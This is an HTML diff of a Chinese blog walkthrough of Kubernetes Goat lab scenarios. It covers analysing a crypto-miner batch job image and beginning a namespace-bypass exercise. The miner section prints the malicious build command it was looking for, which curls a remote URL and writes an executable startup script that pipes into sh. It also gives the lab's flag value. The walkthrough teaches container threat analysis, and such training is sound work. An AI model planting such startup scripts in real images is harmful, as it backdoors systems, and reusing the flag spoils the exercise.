@@ -410,21 +410,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-05-19
+                    2025-05-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    11k
+                    13.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    43 分
+                    55 分
                 </div>
                 
 
@@ -1693,6 +1693,340 @@ ctr <span class="token parameter variable">-n</span> k8s.io containers list<span
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2014.23.44.png" style="zoom:50%;">
 
 <p>由于NodePort配置，我们可以访问不公开的内部服务。</p>
+<h2 id="3-7-Analyzing-crypto-miner-container-bug"><a href="#3-7-Analyzing-crypto-miner-container-bug" class="headerlink" title="3.7 Analyzing crypto miner container[bug]"></a>3.7 Analyzing crypto miner container[bug]</h2><p>分析k8s集群中的挖矿容器。</p>
+<h3 id="3-7-1-场景介绍"><a href="#3-7-1-场景介绍" class="headerlink" title="3.7.1 场景介绍"></a>3.7.1 场景介绍</h3><p>加密货币挖矿攻击正肆虐现代云平台，尤其像Kubernetes这样的容器编排系统更是天然的攻击靶场——毕竟大家往往不会深究容器镜像的底层组件，也缺乏主动监控机制。本案例展示如何分析k8s容器中暗藏的”挖矿杀手”。</p>
+<p>很多使用容器的开发者都会从Docker Hub这类公共镜像仓库下载镜像，但这些平台经常被黑。攻击者会故意上传植入挖矿程序的镜像，偷偷占用受害者的服务器资源。</p>
+<p>攻击者惯用的手法就是把挖矿镜像塞进公共容器仓库（比如Docker Hub）。这些镜像的Dockerfile无从查验，所以根本不知道它们是怎么构建的——结果一不留神就把矿机给跑起来了。</p>
+<p>实践目的：</p>
+<ul>
+<li>如何分析容器镜像；</li>
+<li>理解 Kubernetes 任务及其操作方式；</li>
+<li>掌握容器镜像清单中后门和加密矿工的识别方法。</li>
+</ul>
+<h3 id="3-7-2-场景访问"><a href="#3-7-2-场景访问" class="headerlink" title="3.7.2 场景访问"></a>3.7.2 场景访问</h3><p>首先，确定Kubernetes集群中的所有资源、镜像和作业。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get <span class="token function">jobs</span> <span class="token parameter variable">-A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><code>kubectl get jobs -A</code> 命令用于在 Kubernetes 集群中<strong>列出所有命名空间（Namespace）下的 Job 资源</strong>，并显示它们的关键状态信息。</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2011.15.41.png" style="zoom:40%;">
+
+<p>目标：在批处理作业容器镜像中找到k8s_goat_flag标志值。</p>
+<h3 id="3-7-3-实践"><a href="#3-7-3-实践" class="headerlink" title="3.7.3 实践"></a>3.7.3 实践</h3><ul>
+<li>排查k8s中的job</li>
+</ul>
+<blockquote>
+<p> 排查Kubernetes集群内的所有资源。尽可能详细检查集群各节点中所有可用的容器镜像。</p>
+</blockquote>
+<p>一旦我们确定了Kubernetes集群中的作业，我们就可以通过运行以下命令来获取job的信息。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl describe job batch-check-job<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><strong>查看名为 <code>batch-check-job</code> 的 Job 资源的详细信息</strong>，包括配置、状态、事件以及与关联的 Pod 的调试信息。</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2011.32.48.png" style="zoom:50%;">
+
+<ul>
+<li>排查可疑job相关联的pod</li>
+</ul>
+<p>运行下面的命令获取pod信息，该命令显示了带有标签和选择器匹配的pod:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get pods <span class="token parameter variable">--namespace</span> default <span class="token parameter variable">-l</span> <span class="token string">"job-name=batch-check-job"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><strong>列出 <code>default</code> 命名空间中，标签（Label）为 <code>job-name=batch-check-job</code> 的所有 Pod</strong>。</p>
+<p><strong>核心作用</strong></p>
+<ol>
+<li><strong>按标签过滤 Pod</strong><br>Kubernetes 中的 Job 在创建 Pod 时，自动为 Pod 添加 <code>job-name=&lt;Job名称&gt;</code> 的标签。此命令通过标签筛选出该 Job 创建的所有 Pod。</li>
+<li><strong>检查 Job 运行的 Pod</strong><br>Job 执行的任务实际是由它创建的 Pod 完成的。通过此命令可以：<ul>
+<li>查看 Pod 的运行状态（如 <code>Completed</code>、<code>Error</code>、<code>Pending</code>）。</li>
+<li>确认任务是否成功执行（成功完成的 Pod 状态为 <code>Completed</code>）。</li>
+<li>快速定位失败的 Pod，进一步调试日志（使用 <code>kubectl logs &lt;pod-name&gt;</code>）。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.36.32.png" style="zoom:50%;">
+
+<ul>
+<li>排查pod的详细配置信息</li>
+</ul>
+<p>可以通过运行以下命令获得pod规范的所有信息，该命令以YAML输出格式返回整个清单信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get pod batch-check-job-dcfgg <span class="token parameter variable">-o</span> yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><strong>以 YAML 格式输出指定 Pod 的完整配置和实时状态信息</strong>。</p>
+<p><strong>核心作用</strong></p>
+<ol>
+<li><strong>查看 Pod 的完整定义</strong><br>包括容器镜像、环境变量、卷挂载、资源限制等<strong>声明式配置</strong>​（<code>.spec</code> 部分）。</li>
+<li><strong>获取实时状态</strong><br>包含 Pod 的当前状态（如 <code>Running</code>、<code>Pending</code>、<code>Failed</code>）、容器状态、IP 地址、事件等<strong>运行时信息</strong>​（<code>.status</code> 部分）。</li>
+<li><strong>调试与分析</strong><br>通过 YAML 的完整信息，可以快速定位以下问题：<ul>
+<li><strong>容器启动失败</strong>（如镜像拉取错误、命令执行失败）。</li>
+<li><strong>资源不足</strong>（如 CPU/内存请求超出节点可用资源）。</li>
+<li><strong>网络或存储配置问题</strong>（如 PersistentVolume 绑定失败）。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.41.24.png" style="zoom:30%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.47.38.png" style="zoom:40%;">
+
+<p>可以看到这个这个作业pod正在运行docker.io/madhuakula/k8s-goat-batch-check docker容器镜像：</p>
+<ul>
+<li>分析镜像构建命令</li>
+</ul>
+<p>现在我们可以对容器镜像像进行分析，查看它的layers以及它是如何创建的。在这里，我们可以看到其中一层包含了在构建时执行外部脚本的命令。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">history</span> --no-trunc docker.io/madhuakula/k8s-goat-batch-check<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><strong>查看指定 Docker 镜像的构建历史（各层指令的完整命令）</strong>，用于分析镜像的构建过程、依赖项及潜在问题。</p>
+<p>命令解析:</p>
+<ol>
+<li><strong><code>docker history</code></strong><br>Docker CLI 子命令，用于显示镜像的构建历史（各层的创建步骤）。</li>
+<li><strong><code>--no-trunc</code></strong><br>显示<strong>完整命令</strong>​（不截断输出），避免省略长指令（如 <code>RUN</code> 后的复杂脚本）。</li>
+</ol>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2013.54.22.png" style="zoom:50%;">
+
+<ul>
+<li>分析恶意命令</li>
+</ul>
+<p>环境问题没有在docker history中找到curl恶意命令[bug]，正常情况下会在构建命令中看到如下的恶意命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo 'id' | sh "</span> <span class="token operator">&gt;</span> /usr/bin/system-startup <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x /usr/bin/system-startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2014.12.10.png" style="zoom:50%;">
+
+<ul>
+<li>flag</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">k8s-goat-a5e0a28fa75bf429123943abedb065d1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="3-8-Kubernetes-namespaces-bypass"><a href="#3-8-Kubernetes-namespaces-bypass" class="headerlink" title="3.8 Kubernetes namespaces bypass"></a>3.8 Kubernetes namespaces bypass</h2><p>k8s命名空间绕过：从k8s pod中绕过k8s Namespace来访问集群。</p>
+<h3 id="3-8-1-场景介绍"><a href="#3-8-1-场景介绍" class="headerlink" title="3.8.1 场景介绍"></a>3.8.1 场景介绍</h3><p>很多人以为，只要把资源部署在不同的命名空间（namespace）里，它们就是安全的，彼此无法互相访问，这是 Kubernetes 世界里一个巨大的误区。现实中，不少多用户环境正是因为这种误解而被攻破，导致关键资源在集群内部暴露。</p>
+<p>默认情况下，Kubernetes 采用的是扁平化网络架构——如果我们想要实现真正的隔离，就得手动设置边界，比如配置网络策略（Network Security Policies, NSP）之类的规则。</p>
+<p>这种攻击手法常见于未严格配置网络策略的集群，攻击者可能通过 Service Account 权限提升或直接访问集群内网 IP，跨命名空间窃取数据。</p>
+<p>Kubernetes 默认采用<strong>扁平化网络架构</strong>，这意味着集群内的任何 Pod/Service 都能互相通信。命名空间（namespace）本身<strong>默认没有任何网络隔离限制</strong>——只要在集群内，一个命名空间的资源就能直接访问其他命名空间的资源。这种设计可能导致横向渗透风险，例如攻击者通过未被限制的 Pod 访问敏感服务。实际防护需依赖 NetworkPolicy 或服务网格（如 Istio）实施微隔离。</p>
+<p>本场景主要围绕如何绕过命名空间限制以访问其他命名空间的资源。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2014.36.30.png" style="zoom:50%;">
+
+<p>实践目的：</p>
+<ul>
+<li>理解Kubernetes命名空间隔离能保障安全的误解。</li>
+<li>了解Kubernetes网络平面模式和跨命名空间通信。</li>
+<li>对网络端口扫描和漏洞进行侦察和测试。</li>
+<li>绕过命名空间限制获得对其他命名空间资源的访问。</li>
+</ul>
+<h3 id="3-8-2-场景访问"><a href="#3-8-2-场景访问" class="headerlink" title="3.8.2 场景访问"></a>3.8.2 场景访问</h3><ul>
+<li>前提：在 default 命名空间里运行恶意容器（hacker-container）。</li>
+</ul>
+<h4 id="1）环境搭建"><a href="#1）环境搭建" class="headerlink" title="1）环境搭建"></a>1）环境搭建</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl run <span class="token parameter variable">-it</span> hacker-container <span class="token parameter variable">--image</span><span class="token operator">=</span>madhuakula/hacker-container -- <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><strong>在 Kubernetes 集群中启动一个名为 <code>hacker-container</code> 的临时 Pod，并以交互模式进入该容器的 Shell 环境</strong>。</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2014.52.13.png" style="zoom:67%;">
+
+<p>还是镜像无法拉取导致容器无法运行。</p>
+<blockquote>
+<p>本地拉取镜像并打包：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull madhuakula/hacker-container
+<span class="token function">docker</span> save madhuakula/hacker-container <span class="token parameter variable">-o</span> hacker-container.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
